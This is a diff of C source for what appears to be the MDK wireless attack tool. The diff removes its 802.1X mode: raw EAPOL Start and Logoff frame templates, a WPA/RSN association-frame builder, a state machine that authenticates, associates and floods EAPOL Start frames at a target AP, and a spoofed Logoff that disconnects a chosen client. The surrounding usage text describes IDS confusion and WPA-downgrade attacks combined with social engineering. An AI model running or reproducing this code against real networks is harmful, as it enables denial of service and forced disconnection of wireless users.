@@ -112,42 +112,8 @@ int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: snif
 
 
 
-#define PKT_EAPOL_START \
-	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
-	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x01\x00\x00"
-
-#define PKT_EAPOL_LOGOFF \
-	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
-	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x02\x00\x00"
-
-#define EAPOL_TEST_START_FLOOD 0
-#define EAPOL_TEST_LOGOFF      1
-#define FLAG_AUTH_WPA     1
-#define FLAG_AUTH_RSN     2
-#define FLAG_TKIP         1
-#define FLAG_CCMP         2
-#define IE_WPA            "\x00\x50\xf2\x01\x01\x00"
-#define IE_WPA_TKIP       "\x00\x50\xf2\x02"
-#define IE_WPA_CCMP       "\x00\x50\xf2\x04"
-#define IE_WPA_KEY_MGMT   "\x00\x50\xf2\x01"
-#define IE_RSN            "\x30\x12\x01\x00"
-#define IE_RSN_TKIP       "\x00\x0f\xac\x02"
-#define IE_RSN_CCMP       "\x00\x0f\xac\x04"
-#define IE_RSN_KEY_MGMT   "\x00\x0f\xac\x01"
-
-int eapol_test;                              // the actual EAPOL test
-int eapol_state = 0;                         // state of the EAPOL FSM
-unsigned char eapol_src[ETHER_ADDR_LEN];                // src address used for EAPOL frames
-unsigned char eapol_dst[ETHER_ADDR_LEN];                // dst address used for EAPOL frames
-int eapol_wtype = FLAG_AUTH_WPA;             // default auth type: WPA
-int eapol_ucast = FLAG_TKIP;                 // default unicast cipher: TKIP
-int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP
-
-
 		"TEST MODES:\n"
 
-		"x   - 802.1X tests\n"
-		"      EAP tests for WPA(2). Can flood EAPOL start and EAPOL logoff messages.\n"
 		"w   - WIDS/WIPS Confusion\n"
 		"      Confuse/Abuse Intrusion Detection and Prevention Systems by\n"
 		"      cross-connecting clients to multiple WDS nodes or fake rogue APs.\n"
@@ -161,29 +127,6 @@ int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP
 		"      With this test you can check if the sysadmin will try setting his\n"
 		"      network to WEP or disable encryption. More effective in\n"
 		"      combination with social engineering.\n";
-
-
-char use_eapo[]="x   - 802.1X tests\n"
-		"      0 - EAPOL Start packet flooding\n"
-		"            -n <ssid>\n"
-		"               Use SSID <ssid>\n"
-		"            -t <bssid>\n"
-		"               Set MAC address of target AP\n"
-		"            -w <WPA type>\n"
-		"               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)\n"
-		"            -u <unicast cipher>\n"
-		"               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
-		"            -m <multicast cipher>\n"
-		"               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
-		"            -s <pps>\n"
-		"               Set speed (Default: 400)\n"
-		"      1 - EAPOL Logoff test\n"
-		"            -t <bssid>\n"
-		"               Set MAC address of target AP\n"
-		"            -c <bssid>\n"
-		"               Set MAC address of target STA\n"
-		"            -s <pps>\n"
-		"               Set speed (Default: 400)\n";
 
 char use_wids[]="w   - WIDS/WIPS/WDS Confusion\n"
 		"      Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
@@ -441,226 +384,6 @@ void mac_bruteforce_sniffer()
 
 }
 
-
-struct pckt create_assoc_frame(unsigned char *ssid, int ssid_len, unsigned char *ap, unsigned char *sta, int auth_flag, int ucast_flag, int mcast_flag)
-{
-  struct pckt retn;
-  int ofs = 0;
-  char *hdr = "\x00\x00\x3a\x01"     // type, fc, duration
-	"\x00\x00\x00\x00\x00\x00"   // da
-	"\x00\x00\x00\x00\x00\x00"   // sa
-	"\x00\x00\x00\x00\x00\x00"   // bssid
-	"\x00\xa6"                   // frag, seq
-	"\x31\x05\x0a\x00"           // caps
-	"\x00";                      // ssid tag
-
-  memcpy(pkt, hdr, 29);
-  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);            // set AP
-  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);          // set STA
-  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);           // set BSSID
-  pkt[29] = ssid_len;                // set SSID len
-  memcpy(pkt + 30, ssid, ssid_len);  // set SSID
-  ofs = 30 + ssid_len;
-  memcpy(pkt + ofs, SUPP_RATES, 10); // set supported rates
-  ofs += 10;
-  memcpy(pkt + ofs, EXT_RATES, 6);   // set extended rates
-  ofs += 6;
-
-  if (auth_flag == FLAG_AUTH_WPA) {
-    pkt[ofs] = 0xdd;                 // set VSA id
-    pkt[ofs + 1] = 22;               // set len
-    ofs += 2;
-    memcpy(pkt + ofs, IE_WPA, 6);    // set WPA IE
-    ofs += 6;
-
-    // set multicast cipher stuff
-    switch (mcast_flag) {
-      case FLAG_TKIP:
-        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
-        break;
-      case FLAG_CCMP:
-        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
-        break;
-    }
-
-    // set number of unicast ciphers (1)
-    pkt[ofs + 4] = 0x01;
-    pkt[ofs + 5] = 0x00;
-    ofs += 6;
-
-    // set unicast cipher stuff
-    switch (ucast_flag) {
-      case FLAG_TKIP:
-        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
-        break;
-      case FLAG_CCMP:
-        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
-        break;
-    }
-
-    // set number of auth key management suites (1)
-    pkt[ofs + 4] = 0x01;
-    pkt[ofs + 5] = 0x00;
-    ofs += 6;
-    memcpy(pkt + ofs, IE_WPA_KEY_MGMT, 4);
-    ofs += 4;
-
-  } // FLAG_AUTH_WPA
-
-
-  if (auth_flag == FLAG_AUTH_RSN) {
-    memcpy(pkt + ofs, IE_RSN, 4);    // set RSN IE
-    ofs += 4;
-
-    // set multicast cipher stuff
-    switch (mcast_flag) {
-      case FLAG_TKIP:
-        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
-        break;
-      case FLAG_CCMP:
-        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
-        break;
-    }
-
-    // set number of unicast ciphers (1)
-    pkt[ofs + 4] = 0x01;
-    pkt[ofs + 5] = 0x00;
-    ofs += 6;
-
-    // set unicast cipher stuff
-    switch (ucast_flag) {
-      case FLAG_TKIP:
-        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
-        break;
-      case FLAG_CCMP:
-        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
-        break;
-    }
-
-    // set number of auth key management suites (1)
-    pkt[ofs + 4] = 0x01;
-    pkt[ofs + 5] = 0x00;
-    ofs += 6;
-    memcpy(pkt + ofs, IE_RSN_KEY_MGMT, 4);
-    ofs += 4;
-
-  } // FLAG_AUTH_RSN
-
-  retn.len = ofs;
-  retn.data = pkt;
-
-  return retn;
-}
-
-struct pckt eapol_machine(char *ssid, int ssid_len, unsigned char *target, int flag_wtype, int flag_ucast, int flag_mcast)
-{
-  struct pckt retn;
-  int co, flag, len;
-  int wait_max_frames = 50;
-
-  // GCC Warning avoidance
-  retn.data = NULL;
-  retn.len = 0;
-
-retry:
-
-  // FSM: auth => assoc => eapol start flood
-
-  switch (eapol_state) {
-
-    // assoc
-    case 0:
-      // create a random auth frame
-      retn = create_auth_frame(target, 0, NULL);
-      // save STA MAC for later purposes
-      memcpy(eapol_src, retn.data + 10, 6);
-      eapol_state = 1;
-      return retn;
-
-    // auth
-    case 1:
-      // wait for answer from AP (authentication frame)
-      co = 0;
-      flag = 0;
-      while (1) {
-        co++;
-        if (co > wait_max_frames) break;
-        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
-        if (pkt_sniff[0] == 0xb0) {
-          printf("\ngot authentication frame: ");
-          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[28] == 0x00)) {
-            printf("authentication was successful\n");
-            flag = 1;
-            break;
-          } else printf("from wrong AP or failed authentication!\n");
-	}
-      }  // while
-
-      if (flag) {
-        eapol_state = 2;
-        return create_assoc_frame((unsigned char *) ssid, ssid_len, target, eapol_src, flag_wtype, flag_ucast, flag_mcast);
-      } else {
-        eapol_state = 0;
-        goto retry;
-      }
-      break;
-
-    // EAPOL Start
-    case 2:
-      co = 0;
-      flag = 0;
-      // wait for association response frame
-      while (1) {
-        co++;
-        if (co > wait_max_frames) break;
-        len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
-        if (pkt_sniff[0] == 0x10) {
-          printf("got association response frame: ");
-          if (! memcmp(target, pkt_sniff + 10, ETHER_ADDR_LEN) && (pkt_sniff[26] == 0x00) ) {
-            printf("association was successful\n");
-            flag = 1;
-            break;
-          } else printf("from wrong AP or failed association!\n");
-	}
-      }  // while
-
-      if (flag) {
-        eapol_state = 3;
-        goto retry;
-      } else {
-        // retry auth and assoc
-        eapol_state = 0;
-        goto retry;
-      }
-      break;
-
-    case 3:
-      memcpy(pkt, PKT_EAPOL_START, 36);
-      memcpy(pkt + 4, target, ETHER_ADDR_LEN);
-      memcpy(pkt + 10, eapol_src, ETHER_ADDR_LEN);
-      memcpy(pkt + 16, target, ETHER_ADDR_LEN);
-      retn.len = 36;
-      retn.data = pkt;
-      return retn;
-    }
-
-    // We can never reach this part of code unless somebody messes around with memory
-    // But just to make gcc NOT complain...
-    return retn;
-}
-
-struct pckt eapol_logoff(unsigned char *ap, unsigned char *sta)
-{
-  struct pckt retn;
-
-  memcpy(pkt, PKT_EAPOL_LOGOFF, 36);
-  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);
-  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);
-  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);
-  retn.len = 36;
-  retn.data = pkt;
-  return retn;
-}
 
 struct pckt wids_machine()
 {
@@ -1101,46 +824,6 @@ int mdk_parser(int argc, char *argv[])
 	}
     break;
 
-    case 'x':
-	mode = 'x';
-        if (argc < 4) { printf(use_eapo); return -1; }
-        eapol_test = strtol(argv[3], (char **) NULL, 10);
-        usespeed = 1;
-        pps = 400;
-        eapol_wtype = FLAG_AUTH_WPA;
-        eapol_ucast = FLAG_TKIP;
-        eapol_mcast = FLAG_TKIP;
-	for (t=4; t<argc; t = t + 2)
-	{
-	    if (! strcmp(argv[t], "-n")) {
-              if (! (argc > t+1)) { printf(use_eapo); return -1; }
-              ssid = argv[t + 1];
-	    }
-	    if (! strcmp(argv[t], "-t")) {
-		if (! (argc > t+1)) { printf(use_eapo); return -1; }
-		target = parse_mac(argv[t+1]);
-                memcpy(eapol_dst, target, ETHER_ADDR_LEN);
-	    }
-	    if (! strcmp(argv[t], "-c")) {
-		if (! (argc > t+1)) { printf(use_eapo); return -1; }
-		mac_sa = parse_mac(argv[t+1]);
-                memcpy(eapol_src, mac_sa, ETHER_ADDR_LEN);
-	    }
-	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
-		pps = strtol(argv[t+1], (char **) NULL, 10);
-		usespeed = 1;
-	    }
-	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
-		eapol_wtype = strtol(argv[t+1], (char **) NULL, 10);
-	    }
-	    if (! strcmp(argv[t], "-u")) if (argc > t+1) {
-		eapol_ucast = strtol(argv[t+1], (char **) NULL, 10);
-	    }
-	    if (! strcmp(argv[t], "-m")) if (argc > t+1) {
-		eapol_mcast = strtol(argv[t+1], (char **) NULL, 10);
-	    }
-	}
-	break;
 
     case 'f':
         mode = 'f';
@@ -1190,20 +873,6 @@ int mdk_parser(int argc, char *argv[])
 	return -1;
     }
 
-    if (mode == 'x') {
-	if ( (target == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
-          printf("Please specify MAC of target AP (option -t)\n");
-          return -1;
-        }
-        if ( (ssid == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
-          printf("Please specify a SSID (option -n)\n");
-          return -1;
-        }
-        if ( (mac_sa == NULL) && (eapol_test == EAPOL_TEST_LOGOFF) ) {
-          printf("Please specify MAC of target STA (option -c)\n");
-          return -1;
-        }
-    }
     if (mode == 'g') {
 	if (target == NULL) {
 	    printf("Please specify MAC of target AP (option -t)\n");
@@ -1221,16 +890,6 @@ int mdk_parser(int argc, char *argv[])
 	switch (mode)
 	{
 
-	case 'x':
-            switch (eapol_test) {
-              case EAPOL_TEST_START_FLOOD:
-                frm = eapol_machine(ssid, strlen(ssid), target, eapol_wtype, eapol_ucast, eapol_mcast);
-                break;
-              case EAPOL_TEST_LOGOFF:
-                frm = eapol_logoff(eapol_dst, eapol_src);
-                break;
-            }
-	    break;
 	case 'w':
 	    frm = wids_machine();
 	    break;
